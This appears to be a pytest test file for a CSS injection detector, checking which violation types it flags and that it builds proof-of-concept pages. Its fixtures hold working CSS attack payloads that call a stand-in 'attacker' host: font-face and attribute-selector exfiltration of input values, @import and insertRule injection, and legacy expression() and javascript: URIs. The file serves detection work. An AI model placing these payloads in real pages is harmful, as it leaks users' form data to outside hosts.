"""Unit tests for the CSS Injection (CSSI) detection layer (Phase 30-1).

Tests cover:
  * analyze_page() on fixture HTML for each CSSI violation type.
  * Negative control: safe inline styles produce no violations.
  * build_poc_html() returns a non-empty string for each type.
  * Deduplication of repeated violations.
  * Edge cases: empty input, no <style> blocks, external scripts only.
"""
from __future__ import annotations

import os
import sys

import pytest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from xssentinel.core import css_injection as cssi


# ---------------------------------------------------------------------------
# Fixture HTML samples
# ---------------------------------------------------------------------------
FONT_FACE_HTML = (
    '<html><head><style>'
    '@font-face { font-family: exfil; src: url(https://attacker/?l=1); '
    'unicode-range: U+0041; }'
    'body { font-family: exfil; }'
    '</style></head><body>hi</body></html>'
)

KEYLOGGER_HTML = (
    '<html><head><style>'
    'input[value^="a"] { background: url(https://attacker/?a); }'
    'input[value^="b"] { background: url(https://attacker/?b); }'
    '</style></head><body><input value="secret"></body></html>'
)

IMPORT_HTML = (
    '<html><head><style>'
    '@import url(https://attacker/evil.css);'
    'body { color: red; }'
    '</style></head><body>x</body></html>'
)

CSSOM_HTML = (
    '<html><body><div id="x"></div>'
    '<script>'
    'var el = document.getElementById("x");'
    'el.style.cssText = "color:red;";'
    'el.style.background = "url(https://attacker/?leak)";'
    'var sheet = document.styleSheets[0];'
    'sheet.insertRule("body { margin: 0; }", 0);'
    'sheet.insertRule("@import url(https://attacker/x.css)", 1);'
    '</script></body></html>'
)

TEMPLATE_HTML = (
    '<html><head><style>'
    'body { color: {{ userColor }}; background: ${ userBg }; }'
    '</style></head><body>x</body></html>'
)

LEGACY_HTML = (
    '<html><head><style>'
    '#x { width: expression(alert(1)); }'
    '#y { behavior: url(xss.htc); }'
    '#z { -moz-binding: url(attacker.xml#xss); }'
    'body { background: url(javascript:alert(1)); }'
    '</style></head><body><div id="x"></div></body></html>'
)

DYNAMIC_EXFIL_HTML = (
    '<html><body>'
    '<script>'
    'var char = "a";'
    'var sel = \'input[value^="\' + char + \'"]\';'
    'var rule = sel + \' { background: url(https://attacker/?\' + char + \') }\';'
    'var s = document.createElement("style");'
    's.textContent = rule;'
    'document.head.appendChild(s);'
    '</script></body></html>'
)

SAFE_HTML = (
    '<html><head><style>'
    'body { color: #333; font-family: sans-serif; }'
    '</style></head>'
    '<body><div style="color:blue;">safe</div></body></html>'
)


# ---------------------------------------------------------------------------
# analyze_page tests
# ---------------------------------------------------------------------------
class TestAnalyzePage:
    def test_font_face_exfil_detected(self):
        result = cssi.analyze_page(FONT_FACE_HTML)
        types = [v["type"] for v in result["violations"]]
        assert "css_font_face_exfil" in types

    def test_keylogger_exfil_detected(self):
        result = cssi.analyze_page(KEYLOGGER_HTML)
        types = [v["type"] for v in result["violations"]]
        assert "css_selector_exfil" in types

    def test_import_detected(self):
        result = cssi.analyze_page(IMPORT_HTML)
        types = [v["type"] for v in result["violations"]]
        assert "css_import_injection" in types

    def test_cssom_cssText_sink(self):
        result = cssi.analyze_page(CSSOM_HTML)
        types = [v["type"] for v in result["violations"]]
        assert "cssom_cssText" in types

    def test_cssom_background_sink(self):
        result = cssi.analyze_page(CSSOM_HTML)
        types = [v["type"] for v in result["violations"]]
        assert "cssom_background" in types

    def test_cssom_insertrule_sink(self):
        result = cssi.analyze_page(CSSOM_HTML)
        types = [v["type"] for v in result["violations"]]
        assert "cssom_insertrule" in types

    def test_cssom_insertrule_import_sink(self):
        result = cssi.analyze_page(CSSOM_HTML)
        types = [v["type"] for v in result["violations"]]
        assert "cssom_insertrule_import" in types

    def test_template_reflection_detected(self):
        result = cssi.analyze_page(TEMPLATE_HTML)
        types = [v["type"] for v in result["violations"]]
        assert "css_template_reflection" in types

    def test_legacy_expression_detected(self):
        result = cssi.analyze_page(LEGACY_HTML)
        types = [v["type"] for v in result["violations"]]
        assert "css_expression" in types

    def test_legacy_behavior_detected(self):
        result = cssi.analyze_page(LEGACY_HTML)
        types = [v["type"] for v in result["violations"]]
        assert "css_behavior" in types

    def test_legacy_moz_binding_detected(self):
        result = cssi.analyze_page(LEGACY_HTML)
        types = [v["type"] for v in result["violations"]]
        assert "css_moz_binding" in types

    def test_legacy_javascript_uri_detected(self):
        result = cssi.analyze_page(LEGACY_HTML)
        types = [v["type"] for v in result["violations"]]
        assert "css_javascript_uri" in types

    def test_dynamic_exfil_gadget_detected(self):
        result = cssi.analyze_page(DYNAMIC_EXFIL_HTML)
        types = [v["type"] for v in result["violations"]]
        assert "css_dynamic_exfil_gadget" in types


# ---------------------------------------------------------------------------
# Negative control
# ---------------------------------------------------------------------------
class TestNegativeControl:
    def test_safe_html_no_violations(self):
        result = cssi.analyze_page(SAFE_HTML)
        assert result["violations"] == [], \
            f"expected no violations, got: {[v['type'] for v in result['violations']]}"

    def test_empty_html_no_violations(self):
        assert cssi.analyze_page("")["violations"] == []

    def test_no_style_block_no_violations(self):
        html = '<html><body><p>no styles here</p></body></html>'
        assert cssi.analyze_page(html)["violations"] == []

    def test_external_script_only_no_cssom(self):
        """External script (src=) should not be scanned for CSSOM sinks."""
        html = ('<html><body>'
                '<script src="https://cdn/app.js"></script>'
                '</body></html>')
        result = cssi.analyze_page(html)
        cssom_types = [v["type"] for v in result["violations"]
                       if v["type"].startswith("cssom_")]
        assert cssom_types == []


# ---------------------------------------------------------------------------
# Violation structure
# ---------------------------------------------------------------------------
class TestViolationStructure:
    def test_each_violation_has_required_keys(self):
        result = cssi.analyze_page(LEGACY_HTML)
        for v in result["violations"]:
            assert "type" in v
            assert "severity" in v
            assert "title" in v
            assert "evidence" in v

    def test_severity_is_valid(self):
        result = cssi.analyze_page(LEGACY_HTML)
        valid = {"high", "medium", "low", "info"}
        for v in result["violations"]:
            assert v["severity"] in valid, f"invalid severity: {v['severity']}"

    def test_deduplication(self):
        """Repeated identical violations should be deduplicated."""
        html = (
            '<html><head><style>'
            '@import url(https://attacker/a.css);'
            '@import url(https://attacker/b.css);'
            '</style></head><body>x</body></html>'
        )
        result = cssi.analyze_page(html)
        import_count = sum(1 for v in result["violations"]
                           if v["type"] == "css_import_injection")
        # Both @imports have different evidence strings, so both should
        # be kept (dedup is by (type, evidence-prefix)).
        assert import_count == 2


# ---------------------------------------------------------------------------
# PoC builder
# ---------------------------------------------------------------------------
class TestBuildPoc:
    @pytest.mark.parametrize("vtype", [
        "css_context_escape", "css_font_face_exfil", "css_selector_exfil",
        "css_import_injection", "cssom_insertrule", "cssom_insertrule_import",
        "cssom_cssText", "css_javascript_uri", "css_expression",
        "css_moz_binding", "css_behavior", "css_template_reflection",
        "css_dynamic_exfil_gadget",
    ])
    def test_poc_returns_nonempty_string(self, vtype):
        poc = cssi.build_poc_html("http://example.com/", vtype)
        assert isinstance(poc, str)
        assert len(poc) > 10

    def test_unknown_type_returns_placeholder(self):
        poc = cssi.build_poc_html("http://example.com/", "unknown_type")
        assert "CSSI PoC" in poc


# ---------------------------------------------------------------------------
# Inline style attribute tests
# ---------------------------------------------------------------------------
class TestInlineStyleAttr:
    def test_javascript_uri_in_style_attr(self):
        html = '<div style="background:url(javascript:alert(1))">x</div>'
        result = cssi.analyze_page(html)
        types = [v["type"] for v in result["violations"]]
        assert "css_javascript_uri" in types

    def test_expression_in_style_attr(self):
        html = '<div style="width:expression(alert(1))">x</div>'
        result = cssi.analyze_page(html)
        types = [v["type"] for v in result["violations"]]
        assert "css_expression" in types

    def test_safe_style_attr_no_violation(self):
        html = '<div style="color:blue;font-size:14px;">x</div>'
        result = cssi.analyze_page(html)
        cssi_types = [v["type"] for v in result["violations"]]
        assert cssi_types == []
